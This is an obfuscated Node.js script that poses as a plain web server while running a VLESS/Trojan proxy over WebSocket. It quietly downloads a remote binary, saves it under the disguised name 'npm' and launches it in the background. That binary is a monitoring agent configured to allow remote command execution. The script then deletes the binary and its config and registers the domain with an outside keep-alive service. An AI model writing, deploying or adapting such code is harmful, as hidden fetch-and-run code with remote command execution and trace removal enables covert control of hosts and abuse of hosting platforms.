function _0x1751(_0x43afb1,_0x694e47){_0x43afb1=_0x43afb1-0x145;const _0x1db431=_0x1db4();let _0x1751fb=_0x1db431[_0x43afb1];return _0x1751fb;}const _0x1fdcd4=_0x1751;(function(_0x4f4e94,_0x501d8f){const _0x5d2b90=_0x1751,_0x504913=_0x4f4e94();while(!![]){try{const _0x1258de=-parseInt(_0x5d2b90(0x1ae))/0x1*(parseInt(_0x5d2b90(0x173))/0x2)+-parseInt(_0x5d2b90(0x176))/0x3*(-parseInt(_0x5d2b90(0x19d))/0x4)+parseInt(_0x5d2b90(0x183))/0x5+parseInt(_0x5d2b90(0x18b))/0x6+parseInt(_0x5d2b90(0x1b0))/0x7+parseInt(_0x5d2b90(0x18d))/0x8*(parseInt(_0x5d2b90(0x192))/0x9)+-parseInt(_0x5d2b90(0x182))/0xa;if(_0x1258de===_0x501d8f)break;else _0x504913['push'](_0x504913['shift']());}catch(_0x1bc871){_0x504913['push'](_0x504913['shift']());}}}(_0x1db4,0xdf136));const os=require('os'),http=require(_0x1fdcd4(0x1af)),fs=require('fs'),axios=require(_0x1fdcd4(0x1ac)),net=require(_0x1fdcd4(0x180)),path=require(_0x1fdcd4(0x19a)),crypto=require(_0x1fdcd4(0x186)),{Buffer}=require(_0x1fdcd4(0x15b)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1fdcd4(0x15c)][_0x1fdcd4(0x16f)]||'fc886535-ba9f-426a-96c6-db4c87db17a3',NEZHA_SERVER=process[_0x1fdcd4(0x15c)][_0x1fdcd4(0x189)]||'',NEZHA_PORT=process[_0x1fdcd4(0x15c)][_0x1fdcd4(0x152)]||'',NEZHA_KEY=process[_0x1fdcd4(0x15c)][_0x1fdcd4(0x161)]||'',DOMAIN=process[_0x1fdcd4(0x15c)][_0x1fdcd4(0x14b)]||_0x1fdcd4(0x165),AUTO_ACCESS=process['env'][_0x1fdcd4(0x194)]||!![],WSPATH=process[_0x1fdcd4(0x15c)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x1fdcd4(0x15c)]['SUB_PATH']||_0x1fdcd4(0x1bc),NAME=process[_0x1fdcd4(0x15c)]['NAME']||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x505346=_0x1fdcd4;try{const _0x50ca22=await axios[_0x505346(0x14c)](_0x505346(0x148)),_0x10f455=_0x50ca22[_0x505346(0x195)];ISP=(_0x10f455['country_code']+'-'+_0x10f455[_0x505346(0x17d)])[_0x505346(0x172)](/ /g,'_');}catch(_0x318752){ISP=_0x505346(0x1a5);}};GetISP();const httpServer=http[_0x1fdcd4(0x1ab)]((_0x53c9bf,_0x5956e4)=>{const _0xa9d00d=_0x1fdcd4;if(_0x53c9bf[_0xa9d00d(0x1a8)]==='/'){const _0x1ce426=path[_0xa9d00d(0x181)](__dirname,_0xa9d00d(0x1b8));fs['readFile'](_0x1ce426,_0xa9d00d(0x19b),(_0x46970c,_0x476024)=>{const _0x239b2d=_0xa9d00d;if(_0x46970c){_0x5956e4[_0x239b2d(0x167)](0xc8,{'Content-Type':_0x239b2d(0x188)}),_0x5956e4[_0x239b2d(0x16d)](_0x239b2d(0x16b));return;}_0x5956e4['writeHead'](0xc8,{'Content-Type':_0x239b2d(0x188)}),_0x5956e4[_0x239b2d(0x16d)](_0x476024);});return;}else{if(_0x53c9bf[_0xa9d00d(0x1a8)]==='/'+SUB_PATH){const _0x49611f=NAME?NAME+'-'+ISP:ISP,_0x380ca9=_0xa9d00d(0x174)+UUID+'@'+DOMAIN+_0xa9d00d(0x1a7)+DOMAIN+_0xa9d00d(0x1a1)+DOMAIN+_0xa9d00d(0x170)+WSPATH+'#'+_0x49611f,_0x3e68f1='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0xa9d00d(0x1a1)+DOMAIN+_0xa9d00d(0x170)+WSPATH+'#'+_0x49611f,_0x477d4e=_0x380ca9+'\x0a'+_0x3e68f1,_0x459cf9=Buffer[_0xa9d00d(0x1bb)](_0x477d4e)[_0xa9d00d(0x1b6)]('base64');_0x5956e4[_0xa9d00d(0x167)](0xc8,{'Content-Type':_0xa9d00d(0x19f)}),_0x5956e4['end'](_0x459cf9+'\x0a');}else _0x5956e4[_0xa9d00d(0x167)](0x194,{'Content-Type':_0xa9d00d(0x19f)}),_0x5956e4[_0xa9d00d(0x16d)](_0xa9d00d(0x1b1));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x1fdcd4(0x172)](/-/g,''),DNS_SERVERS=[_0x1fdcd4(0x1a9),_0x1fdcd4(0x150)];function resolveHost(_0x5d2dd6){return new Promise((_0x446ede,_0x3262ee)=>{const _0x2e6a08=_0x1751;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2e6a08(0x17f)](_0x5d2dd6)){_0x446ede(_0x5d2dd6);return;}let _0x4f2e76=0x0;function _0x1debb3(){const _0x31fc18=_0x2e6a08;if(_0x4f2e76>=DNS_SERVERS['length']){_0x3262ee(new Error(_0x31fc18(0x1a0)+_0x5d2dd6+_0x31fc18(0x18c)));return;}const _0x1d47ff=DNS_SERVERS[_0x4f2e76];_0x4f2e76++;const _0x48ca2b=_0x31fc18(0x154)+encodeURIComponent(_0x5d2dd6)+_0x31fc18(0x171);axios['get'](_0x48ca2b,{'timeout':0x1388,'headers':{'Accept':_0x31fc18(0x1bd)}})[_0x31fc18(0x17b)](_0x3a6c42=>{const _0x3c815e=_0x31fc18,_0xd0b43d=_0x3a6c42['data'];if(_0xd0b43d['Status']===0x0&&_0xd0b43d[_0x3c815e(0x168)]&&_0xd0b43d[_0x3c815e(0x168)][_0x3c815e(0x17a)]>0x0){const _0x11c497=_0xd0b43d[_0x3c815e(0x168)][_0x3c815e(0x197)](_0x38d394=>_0x38d394[_0x3c815e(0x19e)]===0x1);if(_0x11c497){_0x446ede(_0x11c497[_0x3c815e(0x195)]);return;}}_0x1debb3();})[_0x31fc18(0x162)](_0xfe5f0=>{_0x1debb3();});}_0x1debb3();});}function handleVlessConnection(_0x18ae35,_0x1f843d){const _0x164ee1=_0x1fdcd4,[_0x547938]=_0x1f843d,_0x50070c=_0x1f843d['slice'](0x1,0x11);if(!_0x50070c['every']((_0xeeae8c,_0x159f16)=>_0xeeae8c==parseInt(uuid[_0x164ee1(0x16e)](_0x159f16*0x2,0x2),0x10)))return![];let _0x531bbe=_0x1f843d[_0x164ee1(0x153)](0x11,0x12)[_0x164ee1(0x1aa)]()+0x13;const _0x58080f=_0x1f843d[_0x164ee1(0x153)](_0x531bbe,_0x531bbe+=0x2)['readUInt16BE'](0x0),_0x5f4812=_0x1f843d[_0x164ee1(0x153)](_0x531bbe,_0x531bbe+=0x1)['readUInt8'](),_0x16cd14=_0x5f4812==0x1?_0x1f843d[_0x164ee1(0x153)](_0x531bbe,_0x531bbe+=0x4)[_0x164ee1(0x181)]('.'):_0x5f4812==0x2?new TextDecoder()[_0x164ee1(0x14e)](_0x1f843d[_0x164ee1(0x153)](_0x531bbe+0x1,_0x531bbe+=0x1+_0x1f843d[_0x164ee1(0x153)](_0x531bbe,_0x531bbe+0x1)[_0x164ee1(0x1aa)]())):_0x5f4812==0x3?_0x1f843d[_0x164ee1(0x153)](_0x531bbe,_0x531bbe+=0x10)[_0x164ee1(0x166)]((_0xbdbd33,_0x3fc4a5,_0x24172b,_0x397c4f)=>_0x24172b%0x2?_0xbdbd33[_0x164ee1(0x187)](_0x397c4f[_0x164ee1(0x153)](_0x24172b-0x1,_0x24172b+0x1)):_0xbdbd33,[])[_0x164ee1(0x1b3)](_0x18302d=>_0x18302d[_0x164ee1(0x191)](0x0)['toString'](0x10))[_0x164ee1(0x181)](':'):'';_0x18ae35[_0x164ee1(0x198)](new Uint8Array([_0x547938,0x0]));const _0x2740c0=createWebSocketStream(_0x18ae35);return resolveHost(_0x16cd14)[_0x164ee1(0x17b)](_0xf5096c=>{const _0x2ec548=_0x164ee1;net[_0x2ec548(0x14d)]({'host':_0xf5096c,'port':_0x58080f},function(){const _0x808fc2=_0x2ec548;this['write'](_0x1f843d[_0x808fc2(0x153)](_0x531bbe)),_0x2740c0['on'](_0x808fc2(0x164),()=>{})[_0x808fc2(0x1ba)](this)['on'](_0x808fc2(0x164),()=>{})[_0x808fc2(0x1ba)](_0x2740c0);})['on'](_0x2ec548(0x164),()=>{});})['catch'](_0x3c8a97=>{const _0x36478a=_0x164ee1;net[_0x36478a(0x14d)]({'host':_0x16cd14,'port':_0x58080f},function(){const _0x42160d=_0x36478a;this[_0x42160d(0x16c)](_0x1f843d['slice'](_0x531bbe)),_0x2740c0['on'](_0x42160d(0x164),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x2740c0);})['on'](_0x36478a(0x164),()=>{});}),!![];}function handleTrojanConnection(_0x2c4910,_0x29fb26){const _0x4f6636=_0x1fdcd4;try{if(_0x29fb26[_0x4f6636(0x17a)]<0x3a)return![];const _0x2360a8=_0x29fb26[_0x4f6636(0x153)](0x0,0x38)[_0x4f6636(0x1b6)](),_0x37435d=[UUID];let _0x1cb5f3=null;for(const _0x1ec016 of _0x37435d){const _0x280290=crypto['createHash'](_0x4f6636(0x1b5))[_0x4f6636(0x158)](_0x1ec016)['digest']('hex');if(_0x280290===_0x2360a8){_0x1cb5f3=_0x1ec016;break;}}if(!_0x1cb5f3)return![];let _0x45c139=0x38;_0x29fb26[_0x45c139]===0xd&&_0x29fb26[_0x45c139+0x1]===0xa&&(_0x45c139+=0x2);const _0x2ceb82=_0x29fb26[_0x45c139];if(_0x2ceb82!==0x1)return![];_0x45c139+=0x1;const _0x522de3=_0x29fb26[_0x45c139];_0x45c139+=0x1;let _0x25f2f4,_0x9214cd;if(_0x522de3===0x1)_0x25f2f4=_0x29fb26[_0x4f6636(0x153)](_0x45c139,_0x45c139+0x4)[_0x4f6636(0x181)]('.'),_0x45c139+=0x4;else{if(_0x522de3===0x3){const _0x41cfdf=_0x29fb26[_0x45c139];_0x45c139+=0x1,_0x25f2f4=_0x29fb26['slice'](_0x45c139,_0x45c139+_0x41cfdf)['toString'](),_0x45c139+=_0x41cfdf;}else{if(_0x522de3===0x4)_0x25f2f4=_0x29fb26[_0x4f6636(0x153)](_0x45c139,_0x45c139+0x10)[_0x4f6636(0x166)]((_0x393611,_0x42fcc0,_0xbfd8ec,_0x11960d)=>_0xbfd8ec%0x2?_0x393611[_0x4f6636(0x187)](_0x11960d['slice'](_0xbfd8ec-0x1,_0xbfd8ec+0x1)):_0x393611,[])[_0x4f6636(0x1b3)](_0x343475=>_0x343475[_0x4f6636(0x191)](0x0)[_0x4f6636(0x1b6)](0x10))[_0x4f6636(0x181)](':'),_0x45c139+=0x10;else return![];}}_0x9214cd=_0x29fb26[_0x4f6636(0x191)](_0x45c139),_0x45c139+=0x2;_0x45c139<_0x29fb26[_0x4f6636(0x17a)]&&_0x29fb26[_0x45c139]===0xd&&_0x29fb26[_0x45c139+0x1]===0xa&&(_0x45c139+=0x2);const _0x476601=createWebSocketStream(_0x2c4910);return resolveHost(_0x25f2f4)[_0x4f6636(0x17b)](_0xa8d39b=>{const _0x26078d=_0x4f6636;net[_0x26078d(0x14d)]({'host':_0xa8d39b,'port':_0x9214cd},function(){const _0x3c3221=_0x26078d;_0x45c139<_0x29fb26[_0x3c3221(0x17a)]&&this[_0x3c3221(0x16c)](_0x29fb26[_0x3c3221(0x153)](_0x45c139)),_0x476601['on'](_0x3c3221(0x164),()=>{})[_0x3c3221(0x1ba)](this)['on']('error',()=>{})[_0x3c3221(0x1ba)](_0x476601);})['on'](_0x26078d(0x164),()=>{});})[_0x4f6636(0x162)](_0x549ad1=>{const _0x254e67=_0x4f6636;net[_0x254e67(0x14d)]({'host':_0x25f2f4,'port':_0x9214cd},function(){const _0x5cf957=_0x254e67;_0x45c139<_0x29fb26[_0x5cf957(0x17a)]&&this[_0x5cf957(0x16c)](_0x29fb26[_0x5cf957(0x153)](_0x45c139)),_0x476601['on'](_0x5cf957(0x164),()=>{})[_0x5cf957(0x1ba)](this)['on'](_0x5cf957(0x164),()=>{})[_0x5cf957(0x1ba)](_0x476601);})['on'](_0x254e67(0x164),()=>{});}),!![];}catch(_0x157e6f){return![];}}function _0x1db4(){const _0x1139d0=['update','Server\x20is\x20running\x20on\x20port\x20','writeFileSync','buffer','env','arm64','Automatic\x20Access\x20Task\x20added\x20successfully','config.yaml','npm','NEZHA_KEY','catch','finish','error','1234.abc.com','reduce','writeHead','Answer','listen','log','Hello\x20world!','write','end','substr','UUID','&path=%2F','&type=A','replace','1733062uFBGwe','vless://','trim','430284udIzQc','npm\x20running\x20error:','createWriteStream','client_secret:\x20','length','then','arch','isp','split','test','net','join','49430540tgRXAM','7013870ACRruw','2096','application/json','crypto','concat','text/html','NEZHA_SERVER','error:\x20','6895554PUMLoW','\x20with\x20all\x20DNS\x20servers','11210288XnejZm','close','false','--tls','readUInt16BE','9WxXnoO','https://amd64.ssss.nyc.mn/v1','AUTO_ACCESS','data','\x20-p\x20','find','send','2087','path','utf8','npm\x20is\x20running','28cpmRFr','type','text/plain','Failed\x20to\x20resolve\x20','&fp=chrome&type=ws&host=','443','every','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Unknown','https://oooo.serv00.net/add-url',':443?encryption=none&security=tls&sni=','url','8.8.4.4','readUInt8','createServer','axios','8443','1lnyHsR','http','12361916dqQLoS','Not\x20Found\x0a','https://','map','/bin/bash','sha224','toString','unlink','index.html','2083','pipe','from','sub','application/dns-json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','utf-8','npm\x20download\x20successfully','https://api.ip.sb/geoip','https://amd64.ssss.nyc.mn/agent','stream','DOMAIN','get','connect','decode','aarch64','1.1.1.1','includes','NEZHA_PORT','slice','https://dns.google/resolve?name=','setsid\x20nohup\x20./npm\x20-s\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://arm64.ssss.nyc.mn/v1'];_0x1db4=function(){return _0x1139d0;};return _0x1db4();}wss['on']('connection',(_0x398673,_0x46fd94)=>{const _0x188907=_0x1fdcd4,_0x588b89=_0x46fd94[_0x188907(0x1a8)]||'';_0x398673['once']('message',_0x55b375=>{const _0x550bec=_0x188907;if(_0x55b375['length']>0x11&&_0x55b375[0x0]===0x0){const _0x4d82db=_0x55b375[_0x550bec(0x153)](0x1,0x11),_0xb96833=_0x4d82db[_0x550bec(0x1a3)]((_0x1e2ff6,_0x52520c)=>_0x1e2ff6==parseInt(uuid[_0x550bec(0x16e)](_0x52520c*0x2,0x2),0x10));if(_0xb96833){!handleVlessConnection(_0x398673,_0x55b375)&&_0x398673['close']();return;}}!handleTrojanConnection(_0x398673,_0x55b375)&&_0x398673[_0x550bec(0x18e)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x13e173=_0x1fdcd4,_0x333c74=os[_0x13e173(0x17c)]();return _0x333c74==='arm'||_0x333c74===_0x13e173(0x15d)||_0x333c74===_0x13e173(0x14f)?!NEZHA_PORT?_0x13e173(0x157):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x13e173(0x193):_0x13e173(0x149);},downloadFile=async()=>{const _0x8f2b42=_0x1fdcd4;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x78e8c5=getDownloadUrl(),_0x4fe4f7=await axios({'method':_0x8f2b42(0x14c),'url':_0x78e8c5,'responseType':_0x8f2b42(0x14a)}),_0x4a0207=fs[_0x8f2b42(0x178)](_0x8f2b42(0x160));return _0x4fe4f7[_0x8f2b42(0x195)]['pipe'](_0x4a0207),new Promise((_0x37296f,_0x253d85)=>{const _0x28806e=_0x8f2b42;_0x4a0207['on'](_0x28806e(0x163),()=>{const _0x321fcb=_0x28806e;console['log'](_0x321fcb(0x147)),exec('chmod\x20+x\x20npm',_0x49a411=>{if(_0x49a411)_0x253d85(_0x49a411);_0x37296f();});}),_0x4a0207['on'](_0x28806e(0x164),_0x253d85);});}catch(_0x42159f){throw _0x42159f;}},runnz=async()=>{const _0x3a84cb=_0x1fdcd4;try{const _0x12342f=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x3a84cb(0x146)});if(_0x12342f[_0x3a84cb(0x175)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x198afa){}await downloadFile();let _0x4529c0='',_0x431865=[_0x3a84cb(0x1a2),_0x3a84cb(0x1ad),_0x3a84cb(0x184),_0x3a84cb(0x199),_0x3a84cb(0x1b9),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x19c91a=_0x431865[_0x3a84cb(0x151)](NEZHA_PORT)?_0x3a84cb(0x190):'';_0x4529c0=_0x3a84cb(0x155)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3a84cb(0x196)+NEZHA_KEY+'\x20'+_0x19c91a+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x99cf73=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3a84cb(0x17e)](':')['pop']():'',_0x4a4a7d=_0x431865[_0x3a84cb(0x151)](_0x99cf73)?'true':_0x3a84cb(0x18f),_0x1673d2=_0x3a84cb(0x179)+NEZHA_KEY+_0x3a84cb(0x1be)+NEZHA_SERVER+_0x3a84cb(0x145)+_0x4a4a7d+_0x3a84cb(0x156)+UUID;fs[_0x3a84cb(0x15a)](_0x3a84cb(0x15f),_0x1673d2);}_0x4529c0='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x3a84cb(0x16a)](_0x3a84cb(0x1a4));return;}}try{exec(_0x4529c0,{'shell':_0x3a84cb(0x1b4)},_0x1e97e8=>{const _0x36e62c=_0x3a84cb;if(_0x1e97e8)console[_0x36e62c(0x164)](_0x36e62c(0x177),_0x1e97e8);else console['log'](_0x36e62c(0x19c));});}catch(_0x20a6d3){console[_0x3a84cb(0x164)](_0x3a84cb(0x18a)+_0x20a6d3);}};async function addAccessTask(){const _0x3d296e=_0x1fdcd4;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x200010=_0x3d296e(0x1b2)+DOMAIN;try{const _0xc0359=await axios['post'](_0x3d296e(0x1a6),{'url':_0x200010},{'headers':{'Content-Type':_0x3d296e(0x185)}});console['log'](_0x3d296e(0x15e));}catch(_0x177f4d){}}const delFiles=()=>{const _0x47c4d5=_0x1fdcd4;fs[_0x47c4d5(0x1b7)](_0x47c4d5(0x160),()=>{}),fs[_0x47c4d5(0x1b7)](_0x47c4d5(0x15f),()=>{});};httpServer[_0x1fdcd4(0x169)](PORT,()=>{const _0x314cfd=_0x1fdcd4;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x314cfd(0x16a)](_0x314cfd(0x159)+PORT);});
